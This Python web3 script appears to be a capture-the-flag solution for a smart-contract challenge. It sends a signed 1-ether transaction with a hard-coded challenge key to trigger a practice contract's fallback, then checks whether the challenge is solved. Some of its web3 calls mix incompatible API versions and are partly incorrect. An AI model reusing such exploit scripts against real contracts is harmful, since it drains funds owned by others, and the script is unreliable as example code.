#!/usr/bin/env python3
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('http://165.227.224.40:30716'))
print(w3.is_connected())

priv_key = '0xb269e06de08cb5349eae33922f87b225b0cc8f338f12f8d14c7e57eeddc44572'
acct_address = '0xCA24679EC17D5dE10799A5798B883034646a0195'

setup_address = '0x1De97ec03D3CafF6C8484FF4FDb012C1cfe5aDc5'
setupabi = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "TARGET",
		"outputs": [
			{
				"internalType": "contract ShootingArea",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]

target_address = '0x6e68350f0851E6e68159F30b9DeB86092EE6fd04'
targetabi = [
	{
		"stateMutability": "payable",
		"type": "fallback"
	},
	{
		"inputs": [],
		"name": "firstShot",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "secondShot",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "third",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "thirdShot",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	}
]


target_contract = w3.eth.contract(address=target_address, abi=targetabi)
# firstShot = target_contract.functions.fallback().call()
# secondShot = target_contract.functions.receive().call()
# thirdShot = target_contract.functions.third().call()

transaction = target_contract.functions.fallback().buildTransaction({
    'value': w3.to_wei(1, 'ether'),
    'from': acct_address,
    'nonce': w3.eth.get_transaction_count(acct_address)
    })

signed_tx = w3.eth.account.signTransaction(transaction, private_key=priv_key)
ret = w3.eth.sendRawTransaction(signed_tx.rawTransaction)

print(ret)


setup_contract = w3.eth.contract(address=setup_address, abi=setupabi)
isSolved = setup_contract.functions.isSolved().call()

print(isSolved)